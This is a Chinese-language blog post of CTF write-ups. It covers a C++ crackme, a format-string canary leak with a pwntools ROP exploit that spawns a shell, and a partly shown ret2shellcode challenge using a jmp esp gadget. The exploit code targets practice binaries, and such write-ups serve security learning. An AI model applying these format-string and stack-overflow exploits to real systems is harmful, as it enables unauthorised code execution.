<!DOCTYPE html>
<html>
  
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta name="author" content="starsdestinations">
  
  
  <title>2019-4-17-近期比赛总结 | Hexo</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="Hexo, Theme-AD">
  

  
  <meta name="description" content="starsdestinations的小站">

  

  <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  
    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
    welcome: {"enable":false,"interval":30},
    start_time: "2019-03-13",
    passwords: ["34d4f0765ce3da2322e6cfdce543facea26fe4f4eadde5bd0a986b9df76bd284", ],
    is_post: true,
    lock: false,
    author: "starsdestinations",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":true,"wechat":true},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  <script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  <link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">

  
</head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">starsdestinations</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | 自学历程</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/tags/" target="_self">标签</a>
      
        <a href="/categories/" target="_self">分类</a>
      
        <a href="/friends/" target="_self">友链</a>
      
        <a href="/about/" target="_self">关于</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/starsdestinations/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            标签
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/categories/" target="_self">
            分类
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/friends/" target="_self">
            友链
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            关于
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2019-04-17
    </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    2019-4-17-近期比赛总结
  </h1>
  
  <article class="passage-article">
    <h2 id="2019西湖论剑杯-re-easyCPP"><a href="#2019西湖论剑杯-re-easyCPP" class="headerlink" title="2019西湖论剑杯-re-easyCPP"></a>2019西湖论剑杯-re-easyCPP</h2><p>这题的难点在对C++的STL容器的了解<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt; values;<span class="comment">//创建存放T类型元素的vertor容器。</span></span><br><span class="line"><span class="built_in">vector</span>&lt;T&gt;(向量容器)是一个长度可变的序列，用来存放 T 类型的对象。必要时，可以自动增加容量，但只能在序列的末尾高效地增加或删除元素。</span><br><span class="line">values.push_back();<span class="comment">//在序列的末尾添加一个元素</span></span><br><span class="line">back_inserter();<span class="comment">//创建一个使用push_back的迭代器，把一个vector容器的元素按顺序传递给另一个vector</span></span><br><span class="line">value.end();<span class="comment">//指向value最后一个元素的下一个元素</span></span><br><span class="line">value.begin();<span class="comment">//指向value的第一个元素</span></span><br><span class="line">value.back();<span class="comment">//指向value的最后一个元素</span></span><br><span class="line">transform();<span class="comment">//可以将函数应用到序列的元素上，并将这个函数返回的值保存到另一个序列中，它返回的迭代器指向输出序列所保存的最后一个元素的下一个位置。 </span></span><br><span class="line"><span class="function">OutputIterator <span class="title">transform</span> <span class="params">(InputIterator first1,InputIterator last1,OutputIterator result, UnaryOperation op)</span></span>;</span><br><span class="line">对于一元操作，将op应用于[first1, last1]范围内的每个元素，并将每个操作返回的值存储在以result开头的范围内。给定的op将被连续调用last1-first1+<span class="number">1</span>次。op可以是函数指针或函数对象或lambda表达式。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">v10 = argv;</span><br><span class="line">v21 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v16);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v17);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v20[<span class="number">4</span> * i], v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back((__int64)&amp;v14, (__int64)&amp;v20[<span class="number">4</span> * i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v19) = fib(j);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v13, &amp;v19);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back((__int64)&amp;v15, (__int64)v20);</span><br><span class="line">v3 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;((__int64)&amp;v15);</span><br><span class="line">v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v14);</span><br><span class="line">v19 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">v5 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v19, <span class="number">1L</span>L);</span><br><span class="line"><span class="built_in">std</span>::transform&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;&gt;(</span><br><span class="line">  v5,</span><br><span class="line">  v4,</span><br><span class="line">  v3,</span><br><span class="line">  (__int64)v20);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v18);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;((<span class="keyword">unsigned</span> __int64)&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v16, &amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v18);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;((__int64)&amp;v16, (__int64)&amp;v13) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;((__int64)&amp;v17);</span><br><span class="line">v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v14);</span><br><span class="line">v7 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line"><span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v7);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v6, v10);</span><br></pre></td></tr></table></figure>
<p>整个流程大概就是先创建几个空的vector容器，然后一个容器存放输入的16个数字，然后一个容器存放斐波那契数列，用transform将除了第一个元素外的每一个元素加上第一个元素的值，然后都赋值给一个新的vector容器，之后用accumulate将函数倒序赋值给V19（这一步我看不懂，accumulate是用来计算累加值的，但是这里只用了v19一个参数就实现了倒序，这里纯粹看堆内数据才看出来是倒序），然后让v16=v19，最后比较V16和V13，v13就是斐波那契数列，如果相等就通过，不相等就不通过。<br>精简后的过程就是：输入16个数字，后面十五个数字都加上第一个数字，然后整个数列颠倒，最后和斐波那契数列比较。<br>由此构造需要输入的数组：<br>987<br>-377<br>-610<br>-754<br>-843<br>-898<br>-932<br>-953<br>-966<br>-974<br>-979<br>-982<br>-984<br>-985<br>-986<br>-986<br>就是颠倒的斐波那契数列，除第一个元素外，其它元素都要减去第一个元素。最后得到Your flag is:flag{987-377-843-953-979-985}</p>
<h2 id="2019西湖论剑杯-pwn-store"><a href="#2019西湖论剑杯-pwn-store" class="headerlink" title="2019西湖论剑杯-pwn-store"></a>2019西湖论剑杯-pwn-store</h2><p>基本格式化任意地址泄露和基本rop<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ST20_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = sub_400915();</span><br><span class="line">  v4 = sub_4009A0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you for you share!!"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是main函数，一开始被两个没有置NULL的free迷惑，以为是use after free，赛后经别人提醒才发现是格式化漏洞，当初没好好学，记成了printf里变量没有&amp;才是格式化漏洞，实际只要printf里只有变量就存在格式化漏洞，格式化漏洞的大致原理就是直接printf(&amp;s)的情况下，printf首先会检测变量内是否存在%，如果有就向后检测需要输出哪种类型的变量，比如人为构造s=”%s”，那么printf检测到%s，就会从栈内输出一个字符串类型的变量，相当于printf(“%s”,stack[0])，如果是%x或者%p就能泄露32位和64位系统的栈内值，%n$x中的n$代表偏移n个变量，由此可以实现栈内任意地址泄露。（但是0$的位置我一直没摸清楚，只能通过多泄露几个值对比栈内值得到偏移，但x32系统下一般是调用printf函数时栈内第2个位置）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_400915</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please Tell Your ID:"</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, <span class="number">0x32</span>uLL);</span><br><span class="line">  v0 = strdup(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello "</span>, <span class="number">50L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);<span class="comment">//格式化漏洞</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为这一题开了canary，所以需要泄露canary的值，然后在栈溢出的时候用已知的canary值覆盖就能绕过检测了，同一个进程内栈的canary都是相同的。<br>这里我先通过输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0$p%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p</span><br></pre></td></tr></table></figure></p>
<p>确认printf参数在栈内的起始位置<br><img src="/images/2019-4-17/2019-4-17-2025.png" alt="avatar"><br><img src="/images/2019-4-17/2019-4-17-2026.png" alt="avatar"><br>可以看到<code>%7$p</code>对应的是0x7fffffffe078的0x603260<br>相应的<code>%15$p</code>和<code>%23$p</code>就是canary的值，<code>%25$p</code>就是start+231的地址。<br>知道了canary的值和start+231的址，在之后的栈溢出中就是构造payload了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_4009A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Tell me the size of your story:"</span>);</span><br><span class="line">  v1 = sub_400A54();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = -v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    v1 = <span class="number">1024L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You can speak your story:"</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, v1);</span><br><span class="line">  <span class="keyword">return</span> strdup(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到s离rbp只有0x90，而v1是可以等于任意大小的，非常简单的栈溢出，我决定返回system，在失败了几次后我才想起来这是x64系统，函数的参数传递不再是用栈，而是用寄存器。</p>
<p>X64参数传递：<br>当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, offset aYouCanSpeakYou ; <span class="string">"You can speak your story:"</span></span><br><span class="line">call    <span class="built_in">puts</span></span><br><span class="line">mov     rdx, [rbp+var_A0]</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     rsi, rdx</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    sub_400ABE</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    strdup</span><br><span class="line">mov     [rbp+var_98], rax</span><br><span class="line">mov     rax, [rbp+var_98]</span><br><span class="line">mov     rcx, [rbp+var_8]</span><br><span class="line">xor     rcx, fs:<span class="number">28</span>h</span><br><span class="line">jz      <span class="keyword">short</span> locret_400A52</span><br><span class="line">call    __stack_chk_fail</span><br></pre></td></tr></table></figure></p>
<p>通过阅读结尾的汇编，发现最后会把字符串s存进rax，然后mov rdi,rax。所以我们在输入s时需要先输入”/bin/sh\x00”<br>最后脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=process(<span class="string">'./story'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"%15$p%25$p"</span>)</span><br><span class="line">a=s.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">b=s.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">c=s.recvuntil(<span class="string">"b17"</span>)<span class="comment">#因为程序引用的libc不变的话，低12位是不会变的，也就是start+231的结尾12个bit是固定的，在我的kali系统是固定b17，也可以根据这一点在https://libc.blukat.me/查看相应libc的版本</span></span><br><span class="line">gdb.attach(s)</span><br><span class="line">carry=int(b[<span class="number">0</span>:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line">start_addr=int(c,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print(libc.symbols[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">base_addr=start_addr<span class="number">-231</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">system_addr=base_addr+libc.symbols[<span class="string">'__libc_system'</span>]</span><br><span class="line">bin_addr=base_addr+<span class="number">0x17f573</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"/bin/sh\x00"</span>+<span class="string">'\x00'</span>*<span class="number">8</span>+<span class="string">'a'</span>*<span class="number">0x78</span>+p64(carry)+<span class="string">'a'</span>*<span class="number">8</span>+p64(system_addr)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Tell me the size of your story:"</span>,<span class="string">"-10000"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">"You can speak your story:"</span>,payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="2019嘉韦思杯final-pwn-Bin"><a href="#2019嘉韦思杯final-pwn-Bin" class="headerlink" title="2019嘉韦思杯final-pwn-Bin"></a>2019嘉韦思杯final-pwn-Bin</h2><p>两题pwn只做出来了这一题基本的ret2shellcode，第二题的tcache之前没学过，这次比赛也让我意识到自己总是在重复做一些基本的堆栈溢出，能力已经很久没有提升了，而且密码学自己学了des后就停滞了，这次遇到了简单的AES却没能做出来，决定开始少参加比赛，多潜心学习，而不是继续浪费时间在那些简单题目上了。</p>
<p>这题唯一的难点在要注意到hint<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to exploit train"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"see you~~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序很简单，溢出buf就好了，而且什么保护都没开，直接shellcode就行了，但是因为不知道栈内地址，所以没办法返回shell code的起始地址，然后看到了之前忽略的放在main函数之前的hint函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:080484ED hint            proc near</span><br><span class="line">.text:080484ED ; __unwind &#123;</span><br><span class="line">.text:080484ED                 push    ebp</span><br><span class="line">.text:080484EE                 mov     ebp, esp</span><br><span class="line">.text:080484F0                 jmp     esp</span><br><span class="line">.text:080484F0 hint            endp</span><br><span class="line">.text:080484F0</span><br></pre></td></tr></table></figure></p>
